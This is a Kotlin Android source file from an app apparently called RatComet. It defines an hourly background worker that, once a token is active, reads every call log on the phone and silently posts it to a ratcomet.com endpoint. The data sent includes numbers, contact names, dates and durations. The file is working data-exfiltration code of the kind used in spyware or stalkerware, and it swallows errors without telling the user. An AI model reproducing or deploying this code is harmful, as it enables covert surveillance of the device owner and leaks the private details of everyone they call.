package ug.hix.ratcomet.workers

import android.content.Context
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.github.kittinunf.fuel.core.extensions.jsonBody
import com.github.kittinunf.fuel.httpPost
import com.google.gson.Gson
import com.wickerlabs.logmanager.LogsManager
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import ug.hix.ratcomet.Repository
import ug.hix.ratcomet.model.ContactLog
import ug.hix.ratcomet.util.CometUtil

class HourWorker(private val appContext: Context, workerParams: WorkerParameters) : CoroutineWorker(appContext, workerParams) {

    override suspend fun doWork(): Result = withContext(Dispatchers.IO){
        val repo = Repository(appContext)

       try {
            val isActive = CometUtil.isActiveToken(repo)
            if(isActive == "true") {
                val logsManager = LogsManager(appContext)
                val callLogs = logsManager.getLogs(LogsManager.ALL_CALLS).map { log ->
                    ContactLog(
                        date = CometUtil.dateTime(log.date),
                        duration = log.coolDuration,
                        type = log.type,
                        phoneNumber = CometUtil.sanitizePhone(log.number),
                        name = log.contactName
                    )
                }
                if (callLogs.isNotEmpty()) {
                    "https://ratcomet.com/api/call_logs".httpPost()
                        .jsonBody(Gson().toJson(callLogs))
                        .responseString()
                }
            }
            Result.success()
        } catch (e: Exception) {

            Result.failure()
        }
    }

}